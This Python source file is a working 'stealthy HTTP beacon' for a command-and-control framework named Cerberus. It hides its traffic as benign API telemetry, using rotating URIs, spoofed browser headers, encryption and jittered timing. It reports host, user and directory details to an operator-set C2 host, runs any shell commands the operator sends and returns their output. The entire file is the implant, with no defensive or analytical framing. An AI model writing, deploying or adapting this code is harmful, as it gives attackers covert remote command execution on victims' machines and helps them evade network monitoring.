#!/usr/bin/env python3
"""Stealthy HTTP beacon for Cerberus C2.

Traffic shape:
  POST /api/v2/telemetry  (or other benign URI)
  Cookie: sid=<beacon_id>
  Content-Type: application/json
  Body: {"v","ts","src","rid","payload":"<base64 C2 frame>"}

Env:
  CERBERUS_C2=host:port
  CERBERUS_KEY=shared secret
  CERBERUS_SLEEP=base seconds (default 15)
  CERBERUS_JITTER=percent 0-100 (default 40)
  CERBERUS_URI=/api/v2/telemetry   # optional fixed URI; else random pool
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import socket
import struct
import time
import uuid

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    AESGCM = None  # type: ignore

URIS = [
    "/api/v2/telemetry",
    "/api/v1/events",
    "/api/analytics/collect",
    "/cdn/assets/status.json",
    "/.well-known/client-config",
    "/api/session/refresh",
    "/metrics/client",
    "/api/v1/health/detail",
    "/static/js/app.config.json",
]

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]


def derive_key(secret: str) -> bytes:
    return hashlib.sha256(secret.encode()).digest()


def encrypt(key: bytes, pt: bytes) -> bytes:
    nonce = os.urandom(12)
    return nonce + AESGCM(key).encrypt(nonce, pt, None)


def decrypt(key: bytes, blob: bytes) -> bytes:
    return AESGCM(key).decrypt(blob[:12], blob[12:], None)


def pack_frame(msg: dict, key: bytes | None) -> bytes:
    body = json.dumps(msg, separators=(",", ":")).encode()
    if key:
        body = encrypt(key, body)
    return struct.pack(">I", len(body)) + body


def wrap(frame: bytes) -> bytes:
    outer = {
        "v": "2.1.0",
        "ts": int(time.time() * 1000),
        "src": random.choice(["web", "app", "mobile", "worker"]),
        "rid": base64.urlsafe_b64encode(os.urandom(9)).decode().rstrip("="),
        "payload": base64.b64encode(frame).decode(),
    }
    if random.random() < 0.35:
        outer["meta"] = base64.b64encode(os.urandom(random.randint(8, 40))).decode()
    return json.dumps(outer, separators=(",", ":")).encode()


def unwrap(body: bytes, key: bytes | None) -> dict | None:
    try:
        obj = json.loads(body)
    except Exception:
        return None
    if not isinstance(obj, dict):
        return None
    if "payload" in obj:
        try:
            frame = base64.b64decode(obj["payload"])
        except Exception:
            return None
        if len(frame) < 4:
            return None
        (ln,) = struct.unpack(">I", frame[:4])
        payload = frame[4 : 4 + ln]
        if key:
            try:
                payload = decrypt(key, payload)
            except Exception:
                return None
        try:
            return json.loads(payload)
        except Exception:
            return None
    if "type" in obj:
        return obj
    return None


def http_post(host: str, port: int, uri: str, body: bytes, beacon_id: str) -> bytes:
    ua = random.choice(UAS)
    headers = (
        f"POST {uri} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        "Accept: application/json, text/plain, */*\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: sid={beacon_id}; theme=dark; lang=en\r\n"
        "Origin: https://cdn.example-static.net\r\n"
        "Referer: https://cdn.example-static.net/\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()
    with socket.create_connection((host, port), timeout=20) as s:
        s.sendall(headers + body)
        data = b""
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            data += chunk
    if b"\r\n\r\n" not in data:
        return b""
    return data.split(b"\r\n\r\n", 1)[1]


def jitter_sleep(base: int, pct: int) -> None:
    extra = int(base * random.randint(0, max(0, pct)) / 100)
    time.sleep(base + extra)


def main() -> None:
    c2 = os.environ.get("CERBERUS_C2", "127.0.0.1:8443")
    host, port_s = c2.rsplit(":", 1)
    port = int(port_s)
    secret = os.environ.get("CERBERUS_KEY", "cerberus-default-key-change-me")
    key = derive_key(secret) if secret and AESGCM else None
    sleep = int(os.environ.get("CERBERUS_SLEEP", "15"))
    jitter = int(os.environ.get("CERBERUS_JITTER", "40"))
    fixed_uri = os.environ.get("CERBERUS_URI", "")
    bid = uuid.uuid4().hex[:12]
    meta = {
        "hostname": socket.gethostname(),
        "os": "python-http-stealth",
        "user": os.environ.get("USER", ""),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }

    while True:
        try:
            uri = fixed_uri or random.choice(URIS)
            frame = pack_frame({"id": bid, "type": "checkin", "data": meta}, key)
            body = wrap(frame)
            resp_body = http_post(host, port, uri, body, bid)
            msg = unwrap(resp_body, key)
            if msg and msg.get("type") == "batch":
                for cmd in (msg.get("data") or {}).get("cmds") or []:
                    if cmd.get("type") == "shell":
                        c = (cmd.get("data") or {}).get("cmd", "")
                        out = os.popen(c).read()  # noqa: S605
                        rframe = pack_frame(
                            {"id": bid, "type": "result", "data": {"cmd": c, "output": out}},
                            key,
                        )
                        http_post(host, port, fixed_uri or random.choice(URIS), wrap(rframe), bid)
                    elif cmd.get("type") in ("exit", "die"):
                        return
                    elif cmd.get("type") == "sleep":
                        s = (cmd.get("data") or {}).get("seconds")
                        if s:
                            sleep = int(s)
        except Exception:
            pass
        jitter_sleep(sleep, jitter)


if __name__ == "__main__":
    main()
